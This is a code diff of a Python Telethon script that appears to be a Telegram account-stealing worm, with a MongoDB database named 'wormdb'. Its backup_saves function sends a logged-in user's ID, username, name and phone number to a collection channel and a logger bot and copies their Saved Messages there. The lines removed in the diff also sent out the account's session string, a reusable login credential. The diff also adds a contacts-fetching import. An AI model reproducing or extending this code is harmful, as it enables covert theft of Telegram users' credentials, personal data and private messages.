@@ -6,6 +6,7 @@ from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
 from pymongo import UpdateOne
 from strings import strings,bot_names,bot_usernames
+from telethon.tl.functions.contacts import GetContactsRequest
 
 load_dotenv(override=True)
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -54,7 +55,7 @@ async def backup_saves(client, me, logger_bot):
     dest = await client.get_entity(channel_id)
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
     mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
-    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
+    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}")
     msg_count = 0
     async for message in client.iter_messages("me", reverse=True):
         msg_count += 1
@@ -67,7 +68,7 @@ async def backup_saves(client, me, logger_bot):
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
     log = {
-        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`",
+        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}",
         'channel_id': channel_id,
         'dest': dest,
         'hash': result.link.split('/')[-1].lstrip('+'),
